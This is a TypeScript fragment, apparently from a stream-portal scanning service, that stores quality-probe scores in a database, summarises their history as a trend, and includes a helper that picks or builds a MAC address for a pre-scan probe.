  const row = {
    resultId,
    jobId,
    macAddress: mac,
    measuredAt: new Date(),
    overallScore: report.aggregate.overallScore,
    speedScore: report.aggregate.speedScore,
    qualityScore: report.aggregate.qualityScore,
    stabilityScore: report.aggregate.stabilityScore,
    verdict: report.aggregate.verdict,
    throughputMbps: measuredChannel?.probe?.sustainedMbps ?? null,
    requiredMbps: measuredChannel?.probe?.requiredMbps ?? null,
    channelsPlayable: report.aggregate.channelsPlayable,
    channelsProbed: report.aggregate.channelsProbed,
    frozen: report.aggregate.frozenChannels > 0 ? 1 : 0,
    labelMismatches: report.aggregate.labelMismatches,
    viaProxy: report.portal?.viaProxy ?? null,
    source: "scan",
  };

  try {
    await db.insert(qualityProbeRuns).values(row);
  } catch {
    // History is best-effort: never fail a scan because of the audit trail.
    return { runs: [], ewma: null, trend: "insufficient_data" };
  }

  const stored = await db
    .select()
    .from(qualityProbeRuns)
    .where(eq(qualityProbeRuns.resultId, resultId))
    .orderBy(qualityProbeRuns.measuredAt);

  const runs: ProbeRun[] = stored.map((entry) => ({
    id: entry.id,
    resultId: entry.resultId,
    measuredAt: entry.measuredAt.toISOString(),
    overall: entry.overallScore,
    speed: entry.speedScore,
    quality: entry.qualityScore,
    stability: entry.stabilityScore,
    verdict: entry.verdict,
    throughputMbps: entry.throughputMbps,
    requiredMbps: entry.requiredMbps,
    channelsPlayable: entry.channelsPlayable,
    channelsProbed: entry.channelsProbed,
  }));

  const summary = summariseHistory(runs);
  return { runs, ewma: summary.ewma, trend: summary.trend };
}

// ============================================================================
// UA ROTATION HELPERS
// ============================================================================

/** First MAC address of the job (used for the pre-scan handshake probe). */
function firstMacForProbe(macPrefix: string, macList: string[] | null): string {
  if (macList && macList.length > 0) return macList[0];
  return buildMacAddressFromIndex(macPrefix, 0);
}
